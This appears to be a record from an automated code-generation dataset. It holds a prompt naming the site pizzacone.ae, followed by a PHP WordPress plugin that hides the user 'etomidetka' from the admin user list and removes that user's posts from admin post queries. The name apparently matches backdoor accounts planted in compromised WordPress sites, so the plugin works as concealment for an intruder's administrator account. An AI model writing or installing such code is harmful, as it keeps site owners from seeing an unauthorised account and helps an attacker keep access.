"""
Generated Code Metadata:
========================
Original URL: https://pizzacone.ae
Prompt: Write a WordPress plugin that uses `add_filter` and `add_action` to exclude a specific user (e.g., "etomidetka") from the admin user list and post queries, similar to the functionality described on the webpage.
Generated: DETERMINISTIC_b6c1f73cb18c1d49
Batch ID: 20250612_152924
URLs Found: 0
Malicious URLs: 0

Oracle Results:
No URLs checked
"""

# Generated Code:
# ===============

```php
<?php
/**
 * Plugin Name: Exclude User from Admin List
 * Description: A simple WordPress plugin to exclude a specific user from the admin user list and post queries.
 * Version: 1.0
 * Author: Your Name
 */

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) {
    exit;
}

/**
 * Exclude a specific user from the admin user list.
 *
 * @param array $user_query The user query object.
 */
function exclude_user_from_admin_list( $user_query ) {
    // Specify the username to exclude
    $excluded_username = 'etomidetka';

    // Get the user ID of the excluded username
    $excluded_user = get_user_by( 'login', $excluded_username );

    // If the user exists, modify the query to exclude them
    if ( $excluded_user ) {
        $user_query->set( 'exclude', array( $excluded_user->ID ) );
    }
}

// Hook into the 'pre_get_users' action to modify the user query
add_action( 'pre_get_users', 'exclude_user_from_admin_list' );

/**
 * Exclude posts by a specific user from the admin post list.
 *
 * @param WP_Query $query The current query object.
 */
function exclude_user_posts_from_admin( $query ) {
    // Check if we are in the admin area and on the main query
    if ( is_admin() && $query->is_main_query() && $query->is_post_type_archive() ) {
        // Specify the username to exclude
        $excluded_username = 'etomidetka';

        // Get the user ID of the excluded username
        $excluded_user = get_user_by( 'login', $excluded_username );

        // If the user exists, modify the query to exclude their posts
        if ( $excluded_user ) {
            $query->set( 'author__not_in', array( $excluded_user->ID ) );
        }
    }
}

// Hook into the 'pre_get_posts' action to modify the post query
add_action( 'pre_get_posts', 'exclude_user_posts_from_admin' );
```
